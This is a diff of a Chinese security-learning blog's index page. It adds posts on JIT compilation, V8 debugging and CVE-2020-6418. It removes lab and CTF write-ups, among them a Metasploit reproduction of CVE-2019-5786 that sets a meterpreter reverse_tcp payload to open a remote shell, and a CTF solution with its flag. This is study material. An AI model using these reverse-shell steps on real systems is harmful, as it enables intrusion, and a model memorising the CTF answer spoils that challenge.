@@ -202,7 +202,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/chrome/" style="font-size: 15px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 15px;">chrome_bug</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 10px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a>
+                        <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a>
                     </div>
                 </section>
                 
@@ -286,6 +286,244 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-JIT学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-07-17T07:40:39.740Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/">JIT学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p>
+<p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p>
+<h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line">int inc(int a) &#123;</span><br><span class="line">    return a + 1;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;%d\n&quot;, inc(3));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>objdump -d 1</code>查看它的机器码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;inc&gt;:</span><br><span class="line">  400526:	55                   	push   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器</span><br><span class="line">  400527:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40052a:	89 7d fc             	mov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3</span><br><span class="line">  40052d:	8b 45 fc             	mov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中</span><br><span class="line">  400530:	83 c0 01             	add    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递</span><br><span class="line">  400533:	5d                   	pop    %rbp</span><br><span class="line">  400534:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line"> #include&lt;memory.h&gt;</span><br><span class="line"> #include&lt;sys&#x2F;mman.h&gt;</span><br><span class="line">typedef int (* inc_func)(int a); </span><br><span class="line">int main() &#123;</span><br><span class="line">    char code[] &#x3D; &#123; </span><br><span class="line">        0x55,             &#x2F;&#x2F; push rbp</span><br><span class="line">        0x48, 0x89, 0xe5, &#x2F;&#x2F; mov rsp, rbp</span><br><span class="line">        0x89, 0xf8,       &#x2F;&#x2F; mov edi, eax</span><br><span class="line">        0x83, 0xc0, 0x01, &#x2F;&#x2F; add $1, eax</span><br><span class="line">        0x5d,             &#x2F;&#x2F; pop rbp</span><br><span class="line">        0xc3              &#x2F;&#x2F; ret</span><br><span class="line">    &#125;;  </span><br><span class="line">    void * temp &#x3D; mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,</span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); </span><br><span class="line">    memcpy(temp, code, sizeof(code));</span><br><span class="line">    inc_func p_inc &#x3D; (inc_func)temp;</span><br><span class="line">    printf(&quot;%d\n&quot;, p_inc(7));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p>
+<p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">chrome知识点</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-V8漏洞初学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-07-17T06:32:27.475Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">V8漏洞初学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p>
+<blockquote>
+<p>v8编译后二进制名称叫d8.</p>
+</blockquote>
+<h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">browser&#x2F;x64.release$ .&#x2F;d8 --allow-natives-syntax</span><br><span class="line">V8 version 7.5.0 (candidate)</span><br><span class="line">d8&gt; var a &#x3D; [1, 2, 3];</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(a);</span><br><span class="line">0x2ebcfb54dd41 &lt;JSArray[3]&gt;</span><br><span class="line">[1, 2, 3]</span><br><span class="line">d8&gt; %SystemBreak();</span><br><span class="line">Trace&#x2F;breakpoint trap (core dumped)</span><br></pre></td></tr></table></figure>
+
+<p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p>
+<p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p>
+<p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p>
+<p><code>source /path/to/gdbinit_v8</code></p>
+<p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1,2,3];</span><br><span class="line">var b &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var c &#x3D; [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第一次调试</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第二次调试</span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第三次调试</span><br></pre></td></tr></table></figure>
+
+<p>gdb运行d8:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;ctf&#x2F;browser&#x2F;x64.release$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: x64.release&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">[New Thread 0x7ff87fde9700 (LWP 18393)]</span><br><span class="line">[New Thread 0x7ff87f5e8700 (LWP 18394)]</span><br><span class="line">[New Thread 0x7ff87ede7700 (LWP 18395)]</span><br><span class="line">0x12e891f8df11 &lt;JSArray[3]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p>
+<p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p>
+<p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p>
+<p>telescope命令查看内存数据。</p>
+<p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p>
+<h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p>
+<p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p>
+<p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p>
+<p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p>
+<p>一个对象在内存中布局大致如下：</p>
+<ul>
+<li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li>
+<li>prototype：prototype</li>
+<li>elements:对象元素</li>
+<li>length:元素个数</li>
+<li>properties:属性</li>
+</ul>
+<p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p>
+<p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p>
+<p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p>
+<blockquote>
+<p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p>
+</blockquote>
+<h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codercto.com/a/81538.html" target="_blank" rel="noopener">https://www.codercto.com/a/81538.html</a></p>
+<p>后续需要实践做一下这个ctf题目。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2020-6418" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/17/CVE-2020-6418/" class="article-date">
+      <time datetime="2020-07-17T05:11:49.434Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/17/CVE-2020-6418/">CVE-2020-6418</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p>
+<p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p>
+<p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p>
+<p>受影响产品版本：</p>
+<p>Google Chrome Version&lt;80.0.3987.122</p>
+<p>适用于windows,Mac,Linux.</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2020-6418</a></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E8%B0%83%E8%AF%95/" rel="tag">chrome调试</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-攻防世界-pwn-反应釜开关控制" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -969,300 +1207,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-CVE-2019-5786" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/05/12/CVE-2019-5786/" class="article-date">
-      <time datetime="2020-05-12T13:25:06.308Z" itemprop="datePublished">2020-05-12</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/12/CVE-2019-5786/">CVE-2019-5786</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>前言：</p>
-<p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali<br>win7_x86<br>Google_chrome_(32bit)_v72.0.3626.119</p>
-<p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe" target="_blank" rel="noopener">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>
-<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p>
-<p><code>root@kali:~# msfconsole -q</code></p>
-<p><code>msf5 &gt; search chrome_filereader</code></p>
-<blockquote>
-<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p>
-</blockquote>
-<p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>
-<p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p>
-<h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>
-<ul>
-<li><p>readyState：表示读取状态</p>
-<ul>
-<li>empty,0,尚未读取</li>
-<li>loading,1,正在读取</li>
-<li>done,2,读取完成</li>
-</ul>
-</li>
-<li><p>result：表示读取结果，具体格式与读取方式有关：</p>
-<ul>
-<li>readAsArrayBuffer</li>
-<li>readAsBinaryString</li>
-<li>readAsDataURL</li>
-<li>readAsText</li>
-</ul>
-</li>
-<li><p>onprogress：回调函数</p>
-<ul>
-<li>读取Blob触发</li>
-<li>当数据较多时会周期性触发多次</li>
-</ul>
-</li>
-<li><p>onloadend：回调函数</p>
-<ul>
-<li>读取操作完成时触发，不论读取成功或失败</li>
-</ul>
-</li>
-</ul>
-<p>查看模块信息</p>
-<p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p>
-<p>漏洞介绍：</p>
-<figure class="highlight plain"><figcaption><span>information:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">  This exploit takes advantage of a use after free vulnerability in </span><br><span class="line">  Google Chrome 72.0.3626.119 running on Windows 7 x86. The </span><br><span class="line">  FileReader.readAsArrayBuffer function can return multiple references </span><br><span class="line">  to the same ArrayBuffer object, which can be freed and overwritten </span><br><span class="line">  with sprayed objects. The dangling ArrayBuffer reference can be used </span><br><span class="line">  to access the sprayed objects, allowing arbitrary memory access from </span><br><span class="line">  Javascript. This is used to write and execute shellcode in a </span><br><span class="line">  WebAssembly object. The shellcode is executed within the Chrome </span><br><span class="line">  sandbox, so you must explicitly disable the sandbox for the payload </span><br><span class="line">  to be successful.</span><br></pre></td></tr></table></figure>
-
-<p>选择payload<br><code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<blockquote>
-<p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p>
-</blockquote>
-<p>设置payload参数：LHOST为kali ip<br><code>-&gt; set LHOST 192.168.119.128</code></p>
-<p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p>
-<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p>
-<p>启动服务：run 或者exploit</p>
-<p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe<br><code>-&gt; chrome.exe --no-sandbox</code></p>
-<p>在弹出的chome浏览器中访问kali ip:<br><a href="http://192.168.119.128:8080" target="_blank" rel="noopener">http://192.168.119.128:8080</a></p>
-<p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p>
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p>
-<p><a href="https://github.com/exodusintel/CVE-2019-5786" target="_blank" rel="noopener">https://github.com/exodusintel/CVE-2019-5786</a> </p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-攻防世界pwn-guess_num" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" class="article-date">
-      <time datetime="2020-05-08T02:10:21.918Z" itemprop="datePublished">2020-05-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/">攻防世界 guess_num</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p>
-<p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" alt="17627983-c6ff7c8db83a9ec7.png"></p>
-<p>进入sub_C3E()函数，确定满足条件即可cat flag。</p>
-<p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" alt="17627983-1e961fbba4dff1bc.png"></p>
-<p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p>
-<blockquote>
-<p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p>
-</blockquote>
-<p>exp:</p>
-<p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" alt="17627983-82da413e439821bd.png"></p>
-<blockquote>
-<p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p>
-</blockquote>
-<p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" alt="17627983-caa9a4e5b8ce9f1a.png"></p>
-<p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p>
-<p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" alt="17627983-93fb0ad7c552854b.png"></p>
-<p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" alt="YnNVrd.png"></p>
-<p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" alt="YnNMPf.png"></p>
-<p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-攻防世界pwn-string" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" class="article-date">
-      <time datetime="2020-05-08T01:50:36.563Z" itemprop="datePublished">2020-05-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/">攻防世界 string</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>checksec 查看保护机制</p>
-<p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" alt="捕获.PNG"></p>
-<p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p>
-<p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" alt="17627983-1901e053361f6609.png"></p>
-<blockquote>
-<p>注：<code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p>
-</blockquote>
-<p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p>
-<p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" alt="17627983-161d0aad17e6e884.png"></p>
-<p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p>
-<p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p>
-<p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p>
